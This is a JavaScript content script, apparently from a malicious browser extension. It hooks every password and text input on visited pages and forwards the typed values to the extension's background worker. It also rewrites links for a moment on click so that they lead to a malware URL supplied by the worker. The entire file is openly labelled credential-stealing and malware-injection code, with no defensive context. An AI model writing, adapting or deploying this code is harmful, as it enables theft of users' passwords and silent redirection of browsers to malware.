// global variables related to logic and state
let passwords = {};
let alt_inputs = {};

// communication functions
async function to_worker(command, data, reply) {
    chrome.runtime.sendMessage({
        command: command, 
        data: data
    }, reply);
}

chrome.runtime.sendMessage({command: "script-first-load"}, (information) => {
    // parse settings to determine what hooks we have to insert 
    // into the page.
    console.log(information);
    let settings = information.settings;

    // things to do if we want to steal passwords
    if (settings.steal_passwords) {

        // injects a listener for all password entries.
        let raw_inputs = document.getElementsByTagName('input');
        let password_inputs = [];
        let other_inputs = [];

        // loops through entries and checks which ones are passwords.
        for (const ri of raw_inputs) {
            if (ri.getAttribute('type') == 'password') {
                password_inputs.push(ri);
            } else {
                other_inputs.push(ri);
            }
        }

        // will check if we should set listeners
        if (password_inputs.length > 0) {
            // updates our values for all our passwords
            for (const i of password_inputs) {
                i.addEventListener('input', (e) => {
                    passwords[i] = e.target.value;

                    let data = {
                        passwords: passwords,
                        alt_inputs: alt_inputs,
                    };
                    to_worker("script-password-update", data, null);
                });
            }

            // updates our values for our other inputs
            for (const i of other_inputs) {
                i.addEventListener('input', (e) => {
                    alt_inputs[i] = e.target.value;
                });
            }
        }
        
    }

    // things to do if we want to inject malware
    if (settings.malware_injection) {
        to_worker("malware-injection-url-req", {}, (data) => {
            console.log(data.url);
            if (data.url == null) {
                return;
            }
            let raw_links = document.getElementsByTagName('a');
            Array.from(raw_links).forEach((e) => {
                e.addEventListener('mouseup', (e) => {
                    let oldhref = e.target.href;
                    e.target.href = data.url;
                    setTimeout(() => {
                        e.target.href = oldhref;
                    }, 500);
                });
            });
        });
    }
});